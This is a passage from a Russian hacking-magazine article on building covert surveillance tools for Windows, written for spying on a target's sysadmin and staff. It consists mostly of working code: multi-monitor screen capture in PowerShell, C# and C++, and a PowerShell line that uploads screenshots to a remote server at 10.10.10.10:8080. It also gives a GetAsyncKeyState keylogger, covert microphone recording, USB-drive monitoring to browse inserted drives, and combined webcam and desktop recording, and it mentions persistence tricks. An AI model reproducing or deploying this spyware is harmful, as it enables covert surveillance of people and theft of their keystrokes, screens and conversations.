изображение в буфер обмена
Start-Sleep -Milliseconds 250


# Получаем изображение из буфера обмена
$img = [Windows.Forms.Clipboard]::GetImage()


# Сохраняем изображение в файл
$filePath = "C:\1.png"
$img.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)


# Выводим информацию о местоположении сохраненного файла
Write-Host "Скриншот сохранён в файле: $filePath"





                      Успешный снимок экра на

Скрипт работа ет пре дельно просто — имитиру ет нажатие кнопки Print Screen.
  В интерне те мож но даже встретить вариант с автоматической отправ кой
картинки на веб-сер вер.


[Windows.Forms.Sendkeys]::SendWait("{PrtSc}")
Start-Sleep -Milliseconds 250
$x = New-Object System.IO.MemoryStream
[Windows.Forms.Clipboard]::GetImage().Save($x, [System.Drawing.
Imaging.ImageFormat]::Png)
Invoke-WebRequest -Uri "http://10.10.10.10:8080/upload?test.png"
-Method POST -Body ([Convert]::ToBase64String($x.ToArray()))





               Отправка изоб ражения на веб-сервер

Ну как, догадался, что не учел автор? У пользователя может быть несколь ко
мониторов! Например, как у меня.





                         Два монито ра

Что, если хитрый сисадмин ута щил к себе несколько монито ров и пользуется
ими в свое удоволь ствие? Мы из-за это го рискуем упустить важную информа-
цию из виду!





             Кабинет профессионального администратора

Это накладывает некото рые ограничения на выбор наших инс тру ментов. Если
прос то слать нажатие Print Screen через Windows.Forms, то получаем изоб-
ражение с текущего монито ра, что нас не устра ивает.
  Получить картинку со всех экра нов мож но, если обратиться к свойству
AllScreens. Оно лежит в System.Windows.Forms.Screen. На выходе я хочу
получить один большой скриншот, содер жащий изображения со всех монито-
ров, поэтому не обой тись без System.Drawing.
  Мы соз дадим растро вое изображение (bitmap), а затем добавим на него
скриншот с каж дого экрана. Получить изоб ражение с экра на мож но через
метод CopyFromScreen().


using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;


class Program
{
    static void Main()
    {
        // Определяем общую область для всех экранов
        Rectangle totalSize = Rectangle.Empty;
        foreach (Screen screen in Screen.AllScreens)
        {
            totalSize = Rectangle.Union(totalSize, screen.Bounds);
        }


        // Создаем новый битмап с размерами общей области
        using (Bitmap bmpScreenCapture = new Bitmap(totalSize.Width,
totalSize.Height))
        {
            // Создаем графический объект для битмапа
            using (Graphics g = Graphics.FromImage(bmpScreenCapture))
            {
                // Копируем каждый экран по отдельности
                foreach (Screen screen in Screen.AllScreens)
                {
                    g.CopyFromScreen(screen.Bounds.X,
                                     screen.Bounds.Y,
                                     screen.Bounds.X - totalSize.X,
                                     screen.Bounds.Y - totalSize.Y,
                                     screen.Bounds.Size,
                                     CopyPixelOperation.SourceCopy);
                }
            }


            // Сохраняем битмап в файл
            string filename = "screenshot_all.png";
            bmpScreenCapture.Save(filename, ImageFormat.Png);
            Console.WriteLine($"Скриншот всех экранов сохранен как {
filename}");
        }
    }
}





                       Успешный захват экрана

Об рати внимание, что благодаря методу Rectangle.Union() изображения
рас положе ны на холсте в соот ветс твии с настройками монито ров. У меня
в системе мониторы рас положены, как на скриншоте ниже.





                     Расположение мониторов

Ес ли передвинем один экран, то изменит ся и рас положе ние изображений
на снимке.





                    Из менение расположения





               Изменен ное положение изображений

Ту же логику можно реализовать и на PowerShell.


$ScriptBlock = {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms


    $bounds = [System.Drawing.Rectangle]::Empty
    foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
        $bounds = [System.Drawing.Rectangle]::Union($bounds, $screen.
Bounds)
    }


    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.
Height
    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point
]::Empty, $bounds.Size)


    $bmp.Save('C:\1.png', [System.Drawing.Imaging.ImageFormat]::Png)


    $graphics.Dispose()
    $bmp.Dispose()
}


$Runspace = [runspacefactory]::CreateRunspace()
$Runspace.Open()
$PowerShell = [powershell]::Create().AddScript($ScriptBlock)
$PowerShell.Runspace = $Runspace
$PowerShell.Invoke()
$Runspace.Close()


Write-Host "Screenshot saved to C:\1.png"

Этот код, используя опи сан ный выше алго ритм, создаст снимок экрана в C:\
1.png.





          Сни мок экрана, сделан ный при помощи PowerShell

На C++ все будет чуточку слож нее. Так как функция боль шая, я сначала дам
пол ный ее код, а затем разберем его по шагам. Итак, функцию я назвал
SaveBitmap(). Она принимает лишь один параметр — путь, по которому нуж-
но сохранить изображение.


#include <windows.h>
BOOL WINAPI SaveBitmap(WCHAR* wPath)
{
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE* bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);


    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));


    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);


    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;


    DeleteObject(hTempBitmap);


    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(
BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;


    bInfo.bmiHeader = biHeader;


    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;


    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&
bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);



    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL,
CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);


        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten,
NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten,
NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);


    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);


    return TRUE;
}


int main() {
    LPWSTR path = (LPWSTR)L"C:\\1.jpg";
    SaveBitmap(path);
    return 0;
}

В начале идет объ явле ние необходимых структур и переменных, в час тнос ти,
инстан цируем экзем пляры BITMAPFILEHEADER и BITMAPINFOHEADER, они
необходимы для соз дания растрового изоб ражения.


BITMAPFILEHEADER bfHeader;
BITMAPINFOHEADER biHeader;
BITMAPINFO bInfo;
HGDIOBJ hTempBitmap;
HBITMAP hBitmap;
BITMAP bAllDesktops;
HDC hDC, hMemDC;
LONG lWidth, lHeight;
BYTE* bBits = NULL;
HANDLE hHeap = GetProcessHeap();
DWORD cbBits, dwWritten = 0;
HANDLE hFile;

Следующим шагом с помощью GetSystemMetrics() получаем размеры вир-
туального экрана. Виртуальный экран — пря моугольник, в который мож но
вписать изображения со всех монито ров.


INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

Нап ример, если у нас два монито ра: 1920 на 1080 и 3440 на 1440, то по вер-
тикали у это го изображения должно быть 1080 + 1440 пик селей, а по
горизонтали — 3440.





                     Расположение мониторов

Тем не менее очень многое зависит от расположе ния мониторов. Если они
рас положе ны по-другому, то по вертикали может быть 1440, а по горизон-
тали 3440 + 1080 пик селей.
   Чтобы получить контекст устройства (текуще го виртуального экрана),
используем GetDC(). Затем извлекаем информа цию об этом битовом блоке
(HGDIOBJ) через GetCurrentObject() и GetObjectW().


hDC = GetDC(NULL);
hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

Следующим   шагом   остается   пра вильно   подготовить   структуру
BITMAPFILEHEADER, она нужна для всех растро вых фай лов. Параллельно
не забываем об очистке ресурсов.


lWidth = bAllDesktops.bmWidth;
lHeight = bAllDesktops.bmHeight;


DeleteObject(hTempBitmap);


bfHeader.bfType = (WORD)('B' | ('M' << 8));
bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(
BITMAPINFOHEADER);
biHeader.biSize = sizeof(BITMAPINFOHEADER);
biHeader.biBitCount = 24;
biHeader.biCompression = BI_RGB;
biHeader.biPlanes = 1;
biHeader.biWidth = lWidth;
biHeader.biHeight = lHeight;


bInfo.bmiHeader = biHeader;


cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

Затем наконец-то делаем «снимок». Через CreateCompatibleDC() создаем так
называемый кон текст памяти. В него будет помещен наш скриншот. Сле дом
создаем блок сек ции с информацией, определен ной в BITMAPINFO, через
CreateDIBSection(). И (о чудо!) помещаем соз данную секцию в контекст
памяти, а затем копируем в него изображение экрана через BitBlt().


hMemDC = CreateCompatibleDC(hDC);
hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&
bBits, NULL, 0);
SelectObject(hMemDC, hBitmap);
BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

К сло ву, именно функция BitBlt() исполь зуется во всякой вирусняге вроде
HRDP и HVNC. Но описание прин ципа работы таких инстру ментов тянет
далеко не на одну статью (изви няюсь за веселый каламбур).
  Остается лишь счи тать данные и записать их в наш выходной файл.


    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL,
CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);


        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten,
NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten,
NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);


    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);


    return TRUE;
}




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



               КАК УСТРОЕНЫ СРЕДСТВА
       СЛЕЖЕНИЯ ЗА ПОЛЬЗОВАТЕЛЯМИ





ÊÅÉËÎÃÃÅÐ

Не упо мянуть такой инструмент из стандартного джентльменского набора я
не мог, но и в оче редной раз опи сывать пос трочно принцип работы кода
на том же GetAsyncKeyState() или хуках не очень хочет ся. Поэтому прос то
дам ссылки на наиболее удачные реализации и наиболее интересные статьи
на эту тему.
 • «Кей логгер по-домаш нему. Пишем на C# кейлог гер, который не палится
   анти вирусами»;
 • Writing a Decent Win32 Keylogger — тут описано, как писать кейлоггер,
   который кор рек тно логиру ет любые клавиши на любой клавиату ре (при вет
   проблемам с кодировкой!).

А еще в Windows существует функция SetWindowsHookEx(), с ее помощью
можно  уста новить  хук.  Хук позволяет перенап равить поток управле ния
целевой программы в наш код. Если мы поставим хук на WH_KEYBOARD, то
сможем отсле живать все нажатия клавиш в системе.
  Я выложил код подоб ного кейлог гера на GitHub. У программы прос тенький
GUI. Жмешь на кнопку, и хук уста навливается, пос ле чего через Message Box
тебя будут оповещать о нажатии на клавишу.
  Обрати вни мание, что Message Box будет воз никать дважды, даже когда
кла виша была нажата единож ды. Пер вый раз — при опускании клавиши
(WM_KEYDOWN), а затем при поднятии (WN_KEYUP).
   Альтер натив ный  вариант —  использовать  GetAsyncKeyState().  Этот
механизм пытается най ти нажатую в текущий момент кла вишу. Если функция
определи ла, что клавиша нажата, кейлог гер запротоколирует это.


#include <windows.h>
#include <fstream>


int main() {
    std::ofstream file;
    file.open("log.txt", std::fstream::app);


    while (true) {
        Sleep(10); // Пауза, чтобы снизить нагрузку на процессор
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) { // Если клавиша
была нажата
                HWND foreground = GetForegroundWindow();
                if (foreground) {


                        file << char(key); // Запись нажатой клавиши
в файл
                        file.flush();
                }
            }
        }
    }


    file.close();
    return 0;
}

На GitHub есть и полноценная реализация.
   Как вариант, можно логировать нажатые клавиши через ETW, но это сра-
бота ет толь ко с виртуальной (экранной) клавиатурой. Тем не менее такой PoC
тоже есть.


ÀÓÄÈÎ

Хочешь пос лушать, как матерится сисад мин и о чем болтает секретарша?
Давай реализуем поддержку аудио!
  На C++ код, который нам для это го понадобит ся, будет большим, громоз-
дким и неудобным. Плюс для исполнения в памяти (как мы любим) потребу-
ется конверти ровать его в шелл-код, затем думать над инжектором, а уж
делать COFF — это совсем для избран ных. Впрочем, если инте ресно
почитать про выполнение в памяти, то обра ти вни мание на другую мою
статью.
   Итак, вос поль зуемся C#. Для записи аудио удоб но использовать Nuget-
пакет NAudio.
  Сразу же находим пример исполь зования.


 public void StartRec()
 {
     WaveSourceStream = new NAudio.Wave.WaveInEvent();
     WaveSourceStream.DeviceNumber = 0;
     WaveSourceStream.WaveFormat = new WaveFormat(16000,1);
     WaveSourceStream.DataAvailable += sourceStream_DataAvailable;
     WaveSourceStream.StartRecording();
     bufl = new List<byte[]>();
 }

Впро чем, все-таки лучше написать с нуля. У меня получи лась вот такая прог-
рамма.


using System;
using NAudio.Wave;
using NAudio.Lame;


namespace MicrophoneRecordToMp3
{
    class Program
    {
        static void Main(string[] args)
        {
            int deviceNumber = 1;
            string outputFilePath = "recorded_audio.mp3";


            using (var waveIn = new WaveInEvent())
            {
                waveIn.DeviceNumber = deviceNumber;
                waveIn.WaveFormat = new WaveFormat(44100, 1);


                var writer = new LameMP3FileWriter(outputFilePath,
waveIn.WaveFormat, LAMEPreset.STANDARD);


                void WaveInDataAvailable(object sender,
WaveInEventArgs e)
                {
                    writer.Write(e.Buffer, 0, e.BytesRecorded);
                }


                waveIn.DataAvailable += WaveInDataAvailable;


                waveIn.StartRecording();
                Console.WriteLine("Recording... Press Enter to stop
and save the file.");


                Console.ReadLine();


                waveIn.StopRecording();
            }


            Console.WriteLine($"Recording saved to '{outputFilePath}
'");
        }
    }
}

Этот код поз воляет записывать аудио с мик рофона в формате .mp3 до тех
пор, пока не будет нажата клавиша Enter. Проблема в том, что здесь строго
используется некоторое первое (deviceNumber = 1) мик рофон ное устрой-
ство. Чтобы исполь зовать устройство по умолчанию, прос то удалим эти стро-
ки.
  Ниже — финальный PoC.


using System;
using NAudio.Wave;
using NAudio.Lame;


namespace MicrophoneRecordToMp3
{
    class Program
    {
        static void Main(string[] args)
        {
            // Путь для сохранения файла
            string outputFilePath = "recorded_audio.mp3";


            // Инициализация объекта WaveInEvent для записи с
микрофона
            using (var waveIn = new WaveInEvent())
            {
                // Задаем формат записи: частота дискретизации 44100
Гц, один канал (моно)
                waveIn.WaveFormat = new WaveFormat(44100, 1);


                // Создаем MP3 writer и оборачиваем его в using,
чтобы обеспечить корректное закрытие файла
                using (var writer = new LameMP3FileWriter(
outputFilePath, waveIn.WaveFormat, LAMEPreset.STANDARD))
                {
                    // Обработчик события DataAvailable
                    void WaveInDataAvailable(object sender,
WaveInEventArgs e)
                    {
                        writer.Write(e.Buffer, 0, e.BytesRecorded);
                    }


                    // Подписываемся на событие DataAvailable
                    waveIn.DataAvailable += WaveInDataAvailable;


                    // Начинаем запись
                    waveIn.StartRecording();
                    Console.WriteLine("Recording... Press Enter to
stop and save the file.");


                    // Ждем нажатия клавиши Enter для остановки
записи
                    Console.ReadLine();


                    // Останавливаем запись
                    waveIn.StopRecording();
                }
            }


            // Сообщаем о сохранении записи
            Console.WriteLine($"Recording saved to '{outputFilePath}
'");
        }
    }
}

В статье, конеч но, про демонс три ровать тебе звук не могу, но он был успешно
записан, честно-честно! :)





                     Файл с записью звука

Кста ти, если тебя интересу ет спо соб на C++, то можно использовать Windows
Wave API, пример кода есть на GitHub.
  Впрочем, существуют проекты, умеющие писать звук и через DirectX, нап-
ример SharpDXWebcam.
   Хо чешь приколоться над адми ном в лучших традици ях «Запад лос тро-
ения»? Если он любит слушать на работе музыку, то мы можем через NAudio
изме нить уро вень громкости! Устрой дискотеку!


using NAudio.CoreAudioApi;
using System;


public class VolumeChanger
{
    public void SetVolume(int volumeLevel)
    {
        if (volumeLevel < 0 || volumeLevel > 100)
            throw new ArgumentException("Volume must be between 0
and 100.");


        // Инициализация объекта MMDeviceEnumerator для
взаимодействия с аудиоустройствами
        MMDeviceEnumerator devEnum = new MMDeviceEnumerator();
        MMDevice defaultDevice = devEnum.GetDefaultAudioEndpoint(
DataFlow.Render, Role.Multimedia);


        // Приведение указанного уровня громкости в диапазоне от 0
до 100 к диапазону от 0,0 до 1,0
        float normalizedVolumeLevel = volumeLevel / 100.0f;


        // Установка уровня громкости
        defaultDevice.AudioEndpointVolume.MasterVolumeLevelScalar =
normalizedVolumeLevel;


        // Опционально: включение/выключение звука (mute/unmute)
        // defaultDevice.AudioEndpointVolume.Mute = false;
    }
}


class Program
{
    static void Main(string[] args)
    {
        VolumeChanger changer = new VolumeChanger();
        changer.SetVolume(50);  // Установка громкости на 50%
    }
}

Ес ли нам нужно использовать C++, то при дется лезть в COM.


#include <Windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <iostream>


#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "winmm.lib")


int main() {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        std::cout << "Не удалось инициализировать COM библиотеку" <<
std::endl;
        return hr;
    }


    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL,
CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    if (FAILED(hr)) {
        std::cout << "Не удалось создать экземпляр
MMDeviceEnumerator" << std::endl;
        CoUninitialize();
        return hr;
    }


    IMMDevice* defaultDevice = NULL;
    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender,
eMultimedia, &defaultDevice);
    deviceEnumerator->Release();
    if (FAILED(hr)) {
        std::cout << "Не удалось получить устройство по умолчанию" <<
std::endl;
        CoUninitialize();
        return hr;
    }


    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    if (FAILED(hr)) {
        std::cout << "Не удалось активировать интерфейс громкости" <<
std::endl;
        CoUninitialize();
        return hr;
    }


    // Установить громкость (0.0 — минимум, 1.0 — максимум)
    float newVolume = 0.5; // 50%
    hr = endpointVolume->SetMasterVolumeLevelScalar(newVolume, NULL);
    if (FAILED(hr)) {
        std::cout << "Не удалось установить уровень громкости" << std
::endl;
    }
    else {
        std::cout << "Громкость установлена на " << newVolume * 100 <
< "%" << std::endl;
    }


    endpointVolume->Release();
    CoUninitialize();


    return 0;
}




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ



               КАК УСТРОЕНЫ СРЕДСТВА
       СЛЕЖЕНИЯ ЗА ПОЛЬЗОВАТЕЛЯМИ





ÓÑÒÐÎÉÑÒÂÀ

К целево му компь ютеру могут быть подклю чены раз ные устройства: флешки,
телефоны, мышки, клавиату ры. Для работы с устройствами существует целый
класс API.
  Нап ример, великий Павел Йоси фович в своей книге Windows 10 System
Programming   Part  1   на   стра нице  540  демонстрирует  функцию
DisplayDevices(). С ее помощью возможно перечислить под ключенные
устройства.





               Вы вод информации об устройствах


#define INITGUID


#include <string>
#include <vector>
#include <wiaintfc.h>
#include <Windows.h>
#include <SetupAPI.h>
#include <Wiaintfc.h>
#include <Ntddvdeo.h>
#include <initguid.h>
#include <Usbiodef.h>
#include <devpkey.h>
#include <Ntddkbd.h>
#include <ntddmou.h>
#include <ntddvdeo.h>
#include <locale>
#pragma comment(lib, "SetupAPI.lib")


struct DeviceInfo {
    std::wstring SymbolicLink;
    std::wstring FriendlyName;
};


void DisplayDevices(const std::vector<DeviceInfo>& devices, const
char* name) {
    printf("%s\n%s\n", name, std::string(::strlen(name), '-').c_str
());
    for (auto& di : devices) {
        printf("Symbolic link: %ws\n", di.SymbolicLink.c_str());
        printf(" Name: %ws\n", di.FriendlyName.c_str());
        auto hDevice = ::CreateFile(di.SymbolicLink.c_str(),
GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, 0, nullptr);
        if (hDevice == INVALID_HANDLE_VALUE)
            printf(" Failed to open device (%d)\n", ::GetLastError())
;
        else {
            printf(" Device opened successfully!\n");
            ::CloseHandle(hDevice);
        }
    }
    printf("\n");
}
std::vector<DeviceInfo> EnumDevices(const GUID& guid) {
    std::vector<DeviceInfo> devices;
    auto hInfoSet = ::SetupDiGetClassDevs(&guid, nullptr, nullptr,
        DIGCF_PRESENT | DIGCF_INTERFACEDEVICE);
    if (hInfoSet == INVALID_HANDLE_VALUE)
        return devices;
    devices.reserve(4);
    SP_INTERFACE_DEVICE_DATA data = { sizeof(data) };
    PSP_INTERFACE_DEVICE_DETAIL_DATA DevDetail;
    SP_DEVINFO_DATA ddata = { sizeof(ddata) };
    BYTE buffer[1 << 12];
    DWORD dw;
    for (DWORD i = 0; ; i++) {
        if (!::SetupDiEnumDeviceInterfaces(hInfoSet, nullptr, &guid,
i, &data)) {
            dw = GetLastError();
            break;
        }
        ULONG needed, l;
        ::SetupDiGetDeviceInterfaceDetail(hInfoSet, &data, NULL, 0, &
needed, 0);
        l = needed;
        DevDetail = (SP_DEVICE_INTERFACE_DETAIL_DATA*)GlobalAlloc(
GPTR, l + 4);
        DevDetail->cbSize = sizeof(SP_INTERFACE_DEVICE_DETAIL_DATA);
        if (::SetupDiGetDeviceInterfaceDetail(hInfoSet, &data,
DevDetail, l, &needed, &ddata)) {
            DeviceInfo info;
            info.SymbolicLink = DevDetail->DevicePath;
            if (::SetupDiGetDeviceRegistryProperty(hInfoSet, &ddata,
                SPDRP_DEVICEDESC, nullptr, buffer, sizeof(buffer),
nullptr))
                info.FriendlyName = (WCHAR*)buffer;
            devices.push_back(std::move(info));
        }
        dw = GetLastError();
    }
    ::SetupDiDestroyDeviceInfoList(hInfoSet);
    return devices;
}



int main() {
    setlocale(LC_ALL, "");
    auto devices = EnumDevices(GUID_DEVINTERFACE_IMAGE);
    DisplayDevices(devices, "Image");
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_MONITOR), "Monitor")
;
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_DISPLAY_ADAPTER),
"Display Adapter");
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_DISK), "Disk");
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_KEYBOARD),
"keyboard");
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_USB_DEVICE), "usb");
    DisplayDevices(EnumDevices(GUID_DEVINTERFACE_MOUSE), "mouse");
    return 0;
}

Что уж тут говорить, для одной только батареи в Windows есть отдель ный
API — GetSystemPowerStatus().


#include <iostream>
#include <Windows.h>
#include <locale>


int main() {
    setlocale(LC_ALL, "");
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        int batteryLifePercent = sps.BatteryLifePercent;
        if (batteryLifePercent != 255) {
            std::cout << "Текущий заряд батареи: " <<
batteryLifePercent << "%" << std::endl;
        }
        else {
            std::cout << "Заряд батареи неизвестен." << std::endl;
        }
    }
    else {
        std::cout << "Не удалось получить информацию о состоянии
питания." << std::endl;
    }
    return 0;
}





                    Информация о батарее

Кста ти, мож но злоупот реблять Windows Power Management API: реали зовать
необычный метод персиста, при котором наш код будет исполняться
при включении или отключении дисплея. Под робно можно почитать в этом
ресерче VXUG.
   Если опускать ся чуть ниже, то основное вза имодействие с любым устрой-
ством происходит через API DeviceIoControl().


BOOL DeviceIoControl(
    _In_ HANDLE hDevice,
    _In_ DWORD dwIoControlCode,
    _In_ LPVOID lpInBuffer,
    _In_ DWORD nInBufferSize,
    _Out_ LPVOID lpOutBuffer,
    _In_ DWORD nOutBufferSize,
    _Out_opt_ LPDWORD lpBytesReturned,
    _Inout_opt_ LPOVERLAPPED lpOverlapped);

Затык может про изой ти уже на втором аргумен те — dwIoControlCode.
Для каждого устрой ства могут быть уста нов лены собс твенные управляющие
коды, что несколь ко усложняет процесс раз работ ки.
  Тем не менее существует несколько средств, которые помогут разобрать-
ся с устройствами по API. Рекомендую обратить вни мание на DevCon.
Это  полноценная  большая  прог рамма,  которая  поз воляет  извлекать
информацию об устройствах и управлять ими.
  Впрочем, для сле жения нам достаточно лишь вов ремя получать информа-
цию о под клю чении устройства. Из C# в таком случае проще обра щаться
к WMI. Я так сде лал в про екте USB-Monitor.
  Там на помощь пришел WqlEventQuery, с ним мы можем зарегистрировать
колбэк, который будет выз ван при подключении нового USB-устрой ства.
   Даль ше дело за малым — нуж но, исходя из поля Service, определить,
какое устройство вста вили. В слу чае флешки будет стро ка USBSTOR, затем
нуж но конвертировать наз вание физичес кого дис ка  (\\.\PHYSICALDRIVE)
в привыч ную букву (E:), а потом прос то вывес ти содержимое папки, чтобы
уви деть интересные фай лы на флеш ке.
  На C++ можно обрабатывать различные сообщения WM_DEVICE, но для
этого тре буется соз давать оконное при ложе ние, что нам не очень под ходит.


ÂÅÁ-ÊÀÌÅÐÀ

Ес ли у поль зовате ля есть веб-камера, зна чит, мы тоже можем ей восполь-
зоваться. Однако здесь все чуточку сложнее.
  Снова есть варианты работы через DirectX:
 • Get-DXWebcamVideo.ps1;
 • SharpDXWebCam.

Проблема в том, что в этих проектах многова то кода, а нам нужно отно ситель-
но  маленькое  ком пактное  решение.  Поэтому  прибегаем  к  помощи
Accord.Video. Заодно добавим и запись экра на с веб-камеры. Будет пол-
ноценная проктор-программа!
   Код, конеч но, все равно получился немалень ким, поэтому я залил его на
GitHub.
   Стартовая функция выглядит вот так.


private static VideoFileWriter writer;
private static Bitmap videoFrame;
private static Bitmap webcamFrame;
private static readonly object videoFrameLock = new object();
private static readonly object webcamFrameLock = new object();
private static bool isRecording = true;
static void Main()
{
    Rectangle bounds = GetScreenBounds();
    int width = bounds.Width;
    int height = bounds.Height;


    writer = new VideoFileWriter();
    writer.Open("desktop_with_webcam.avi", width, height, 10,
VideoCodec.MPEG4, 10000000);


    Thread screenThread = new Thread(() => CaptureDesktop(bounds));
    screenThread.Start();


    VideoCaptureDevice videoSource = StartWebCamCapture();
    Thread.Sleep(20000); // Двадцать секунд для записи


    isRecording = false;
    videoSource.SignalToStop();
    videoSource.WaitForStop();
    screenThread.Join();
    writer.Close();


    Console.WriteLine("Recording finished.");
}

Сна чала заводим нес коль ко гло бальных перемен ных (это всё внут ри класса
Program, поэтому будет пра вильнее ска зать ста тических). Пос ле чего получа-
ем размеры всех монито ров, что бы понять раз меры виртуального экрана.
Размеры получаем по уже описанному ранее алго ритму.


static Rectangle GetScreenBounds()
{
    Rectangle bounds = Rectangle.Empty;
    foreach (Screen screen in Screen.AllScreens)
    {
        bounds = Rectangle.Union(bounds, screen.Bounds);
    }
    return bounds;
}

Затем инициализирую инстанс клас са VideoFileWriter(). Парамет ры означают,
что будет создан видеофайл desktop_with_webcam.avi раз мером, как у
рабочей области экрана, будет делаться десять кадров в секунду, с исполь-
зованием кодека MPEG4 и битрейтом 10 000 000.
  Сле дующим шагом стартует новый отдель ный поток, в котором происхо-
дит зах ват изображения с рабочих столов.


static void CaptureDesktop(Rectangle bounds)
{
    while (isRecording)
    {
        Bitmap combinedFrame = null;
        lock (videoFrameLock)
        {
            // Создаем битмап с размерами, охватывающими все мониторы
            combinedFrame = new Bitmap(bounds.Width, bounds.Height);
            using (var g = Graphics.FromImage(combinedFrame))
            {
                // Координаты начала захвата учитывают отрицательные
координаты
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0,
bounds.Size);
                lock (webcamFrameLock)
                {
                    if (webcamFrame != null)
                    {
                        // Положение для кадра веб-камеры
                        int x = combinedFrame.Width - webcamFrame.
Width - 10;
                        int y = combinedFrame.Height - webcamFrame.
Height - 10;
                        g.DrawImage(webcamFrame, x, y, webcamFrame.
Width, webcamFrame.Height);
                    }
                }
            }
        }
        writer.WriteVideoFrame(combinedFrame);
        combinedFrame.Dispose();
        Thread.Sleep(100);
    }
}

В основном потоке программы получа ем видео с веб-камеры. Обработка
каждого получа емого кад ра про исхо дит в событии NewFrame, где текущий
кадр клонируется и сохраня ется в перемен ную webcamFrame. Клонирование
нуж но по той при чине, что объект NewFrame как бы считается занятым, и если
обратиться к нему, то вылезет исклю чение.


static VideoCaptureDevice StartWebCamCapture()
{
    FilterInfoCollection videoDevices = new FilterInfoCollection(
FilterCategory.VideoInputDevice);
    if (videoDevices.Count == 0)
        throw new ApplicationException("No webcam found.");
